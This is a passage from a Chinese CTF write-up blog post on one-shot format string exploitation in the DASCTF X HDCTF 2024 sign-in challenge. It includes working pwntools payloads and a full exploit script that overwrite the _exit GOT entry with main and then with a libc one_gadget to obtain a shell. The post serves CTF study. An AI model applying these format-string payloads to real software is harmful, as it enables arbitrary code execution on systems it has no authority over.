<p>利用二连指针修改任意地址值</p>
<p>但是下面的payload并不能成功修改got地址   貌似使用%x$定位的话不能在同一条链子上改两次  (test&gt;exit_got)   没有将0x401030改成功</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(test-exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%49$ln&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071615607.png" alt="image-20240607161549570"></p>
<p>如果是修改不同链上则可以同时修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%8$ln&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071632618.png" alt="image-20240607163238561"></p>
<p>直接使用格式化字符作为占位符的话可以在一条链子上改两次</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%5c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#49</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071654277.png" alt="image-20240607165447235"></p>
<p>这样思路就明确了，先利用二连指针的第一个指针修改第二个指针指向exit_got，然后利用第二个指针修改exit_got地址为main函数地址</p>
<p>由于%hn只将打印出来字符的低二字节修改内存，所以打印出来的字符长度溢出时就能修改低二字节为任意值了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071712038.png" alt="image-20240607171232992"></p>
<p>然后栈上还残留的指向exit_got指针来修改成为one_gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;node5.buuoj.cn 29958&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        io = init(pwnfile, IPort, libc_name)</span><br><span class="line">        exit_got = elf.got[<span class="string">&#x27;_exit&#x27;</span>]</span><br><span class="line">        main     = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        ru(<span class="string">b&#x27;Gift addr: &#x27;</span>)</span><br><span class="line">        stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">        leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">        payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></span><br><span class="line">        payload1 += <span class="string">b&#x27;-%17$p&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">        sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload1) </span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">        one_gadegt = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">        one = libc_base + one_gadegt[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        ori  = one&amp;<span class="number">0xffff</span></span><br><span class="line">        ori1 = one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>  </span><br><span class="line">        ori2 = one&gt;&gt;<span class="number">32</span>&amp;<span class="number">0xffff</span></span><br><span class="line">        ori3 = one&amp;<span class="number">0xffffffff</span></span><br><span class="line">        leak(<span class="string">&quot;one_gadet&quot;</span>, one)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ori &lt; ori1 <span class="keyword">or</span> ori1 &lt; ori2):</span><br><span class="line">            log.failure(<span class="string">&quot;ori is too low...&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            payload2  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">2</span>-<span class="number">35</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">35</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>  <span class="comment">#37</span></span><br><span class="line">            <span class="comment"># payload2 = b&#x27;\x00&#x27;</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload2) </span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line"></span><br><span class="line">            payload3 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">4</span>-<span class="number">14</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">14</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>   <span class="comment">#16</span></span><br><span class="line">            <span class="comment"># payload3 = b&#x27;\x00&#x27;</span></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload3) </span><br><span class="line"></span><br><span class="line">            payload4  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori2-<span class="number">38</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;%hn&#x27;</span>       <span class="comment">#40--&gt;4  7fxx   82--&gt;2  xxxx    85--&gt;0   xxxx</span></span><br><span class="line">            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori1-ori2-<span class="number">40</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span> </span><br><span class="line">            payload4 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori-ori1-<span class="number">1</span>).encode(<span class="string">&quot;utf-8&quot;</span>)   + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span> + <span class="string">b&#x27;%hn&#x27;</span> </span><br><span class="line">            payload4 += <span class="string">b&#x27;\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload4) </span><br><span class="line">            <span class="built_in">print</span>(payload4)</span><br><span class="line">            itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406081607924.png" alt="image-20240608160741823"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><ol>
<li>一次性格式化除非是给了backdoor或者libc基地址，否则一次性是很难打通的，当然不排除一些奇奇怪怪的题目。基本上只给了一个一次性格式化利用的话，都需要构造出第二次利用，无论是改got、fini_array、printf_ret、ret_addr。</li>
<li>栈上格式化字符串直接写地址改数据，非栈上格式化字符串改指针间接改数据</li>
</ol>
<h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><blockquote>
<p>有群u在群里请教了为什么不能用$符号定位使用两次，然后在一条链子上改两次，我在上面的das签到题里面有了些自己的测试，不过还是不如群里的大佬理解得透彻。</p>
<p>自己整理了一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/9man/p/18228214">.N1nEmAn</a>师傅所说的原理：打格式化字符串时，使用$符号作为索引，会将栈的上下文保存到堆上，第一次使用$符号修改目标能正常修改栈上数据，但是堆上的数据没有变，而下次再使用$符号作为索引，会到堆里面去进行修改，而不是在栈上直接修改。这就是为什么不能在同一条链子上改两次。后面也有<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">WJH</a>师傅贴出的博客，里面是WJH师傅对printf的源码分析。这就是与大佬们学习的差距吗，再接再厉！</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://tw11ty.github.io">tw11ty</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/">http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/fmt/">fmt</a></div><div class="post-share"><div class="social-share" data-image="/img/MyImg.png" data-sites="facebook,twitter,wechat,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/06/10/the-end/" title="the_end"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">the_end</div></div><div class="info-2"><div class="info-item-1">hctf2018_the_end远程：2.27-3ubuntu1  每次往一个地址里面写1字节，给了libc _dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive往libc中写入数据，通过exit退出，打exithook，用one_gadget来获取shell 我们劫持ld中rtld_global结构体的_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive 最后打的是_dl_rtld_unlock_recursive   _dl_rtld_lock_recursive没通 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8from pwn import *from tw11ty import *#from ctypes import *if __name__ ==...</div></div></div></a><a class="pagination-related" href="/2024/06/06/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  1234print(&quot;hello world&quot;)def hello_world():    print(&quot;hello world&quot;)    return &quot;hello world&quot;   More info: Server Generate static files1$ hexo generate  More info:...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/MyImg.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">tw11ty</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tw11ty"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/fu37kola" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">简简单单学学技术，不求甚解，不求甚高。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.</span> <span class="toc-text">一次性格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%902023-%E5%BC%BA%E7%BD%91%E6%9D%AF%E3%80%91ez-fmt"><span class="toc-number">1.1.</span> <span class="toc-text">【2023 强网杯】ez_fmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt"><span class="toc-number">1.2.</span> <span class="toc-text">fmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90DASCTF-X-HDCTF-2024-%E5%85%AC%E5%BC%80%E8%B5%9B%E3%80%91%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="toc-number">1.3.</span> <span class="toc-text">【DASCTF X HDCTF 2024 公开赛】签个到吧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">一些思考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/15/WKCTF-pwn/" title="WKCTF-pwn">WKCTF-pwn</a><time datetime="2024-07-15T03:33:07.000Z" title="Created 2024-07-15 11:33:07">2024-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/" title="arm-pwn入门">arm-pwn入门</a><time datetime="2024-07-12T13:02:32.000Z" title="Created 2024-07-12 21:02:32">2024-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/" title="2024春秋杯夏季赛pwn">2024春秋杯夏季赛pwn</a><time datetime="2024-07-07T04:44:56.000Z" title="Created 2024-07-07 12:44:56">2024-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/" title="Iot-vulhub复现">Iot-vulhub复现</a><time datetime="2024-06-25T10:46:14.000Z" title="Created 2024-06-25 18:46:14">2024-06-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/" title="2024ciscn分区赛-pwn复现">2024ciscn分区赛-pwn复现</a><time datetime="2024-06-25T10:23:13.000Z" title="Created 2024-06-25 18:23:13">2024-06-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By tw11ty</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="IOT,VULNERABLE,PWN,CTF,HACK,FMT,STACKOVERFLOW,SECURITY" data-fontsize="15px" data-random="true" async="async"></script><script>(() => {
  const option = null
  const config = {"site_uv":false,"site_pv":false,"page_pv":false,"token":null}

  const runTrack = () => {
    umami.track(props => ({ ...props, url: window.location.pathname, title: GLOBAL_CONFIG_SITE.title }))
  }

  const loadUmamiJS = () => {
    btf.getScript('https://cloud.umami.is/script.js', {
      'data-website-id': '',
      'data-auto-track': 'false',
      ...option
    }).then(runTrack)
  }

  const getData = async (isPost) => {
    const now = Date.now()
    const keyUrl = isPost ? `&url=${window.location.pathname}` : ''
    const headerList = { 'Accept': 'application/json' }
    if (false) headerList['Authorization'] = `Bearer ${config.token}`
    else headerList['x-umami-api-key'] = config.token
    const res = await fetch(`https://api.umami.is/v1/websites//stats?startAt=0000000000&endAt=${now}${keyUrl}`, {
      method: "GET",
      headers: headerList
    })
    return await res.json()
  }

  const insertData = async () => {
    try {
      if (GLOBAL_CONFIG_SITE.isPost && config.page_pv) {
        const pagePV = document.getElementById('umamiPV')
        if (pagePV) {
          const data = await getData(true)
          pagePV.textContent = data.pageviews.value
        }
      } else {
        const data = (config.site_uv || config.site_pv) && await getData()
        if (config.site_uv) {
          const siteUV = document.getElementById('umami-site-uv')
          if (siteUV) siteUV.textContent = data.visitors.value
        }
        if (config.site_pv) {
          const sitePV = document.getElementById('umami-site-pv')
          if (sitePV) sitePV.textContent = data.pageviews.value
        }
      }
    } catch (e) {
      console.error('Failed to load Umami Analytics:', e)
    }
  }

  btf.addGlobalFn('pjaxComplete', runTrack, 'umami_analytics_run_track')
  btf.addGlobalFn('pjaxComplete', insertData, 'umami_analytics_insert')

  loadUmamiJS()
  insertData()
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>